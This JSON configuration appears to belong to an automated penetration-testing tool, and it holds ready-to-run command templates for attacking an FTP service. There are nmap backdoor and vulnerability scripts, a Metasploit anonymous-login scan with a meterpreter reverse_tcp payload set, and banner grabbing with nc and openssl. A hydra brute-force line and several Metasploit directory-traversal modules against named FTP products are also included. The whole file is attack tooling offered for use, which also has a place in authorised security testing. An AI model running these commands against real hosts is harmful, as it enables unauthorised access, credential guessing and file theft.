{
		"name":"ftp",
		"command":[
			{
				"tool":"nmap",
				"command": "nmap -sV -Pn -vv -p $port$ --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 $host$ -oG $file$_nmap_scan.txt",
				"references": "nmap"
			},
			{
				"tool":"metasploit",
				"command": "msfconsole -x 'spool $file$_metasploit_anon.txt; use auxiliary/scanner/ftp/anonymous; set RHOST $host$; set PAYLOAD windows/meterpreter/reverse_tcp; run;exit'",
				"references": "metasploit anonymous"
			},
			{
				"tool":"nc",
				"command":"nc -vn $host$ $port$",
				"references":"netcat banner"
			},
			{
				"tool":"openssl",
				"command":"openssl s_client -connect $host$:$port$ -starttls ftp",
				"references":"openssl banner"
			},
			{
				"tool":"hydra",
				"command":"hydra -f -e ns -L $stat$ftp/ftp-usernames.txt -P $stat$ftp/ftp-usernames.txt -s $port$ $host$ ftp",
				"references":"hydra bruteforce"
			},
			{
				"tool":"metasploit",
				"command": "msfconsole -x 'spool $file$_metasploit_bison_ftp_traversal.txt; use auxiliary/scanner/ftp/bison_ftp_traversal; set RHOST $host$; run;exit'",
				"references": "metasploit bison_ftp_traversal"
			},
			{
				"tool":"metasploit",
				"command": "msfconsole -x 'spool $file$_metasploit_colorado_ftp_traversal.txt; use auxiliary/scanner/ftp/colorado_ftp_traversal; set RHOST $host$; run;exit'",
				"references": "metasploit colorado_ftp_traversal"
			},
			{
				"tool":"metasploit",
				"command": "msfconsole -x 'spool $file$_metasploit_easy_file_sharing_ftp.txt; use auxiliary/scanner/ftp/easy_file_sharing_ftp; set RHOST $host$; run;exit'",
				"references": "metasploit easy_file_sharing_ftp"
			},
			{
				"tool":"metasploit",
				"command": "msfconsole -x 'spool $file$_metasploit_konica_ftp_traversal.txt; use auxiliary/scanner/ftp/konica_ftp_traversal; set RHOST $host$; run;exit'",
				"references": "metasploit konica_ftp_traversal"
			},
			{
				"tool":"metasploit",
				"command": "msfconsole -x 'spool $file$_metasploit_pcman_ftp_traversal.txt; use auxiliary/scanner/ftp/pcman_ftp_traversal; set RHOST $host$; run;exit'",
				"references": "metasploit pcman_ftp_traversal"
			},
			{
				"tool":"metasploit",
				"command": "msfconsole -x 'spool $file$_metasploit_titanftp_xcrc_traversal.txt; use auxiliary/scanner/ftp/titanftp_xcrc_traversal; set RHOST $host$; run;exit'",
				"references": "metasploit titanftp_xcrc_traversal"
			}
		]
}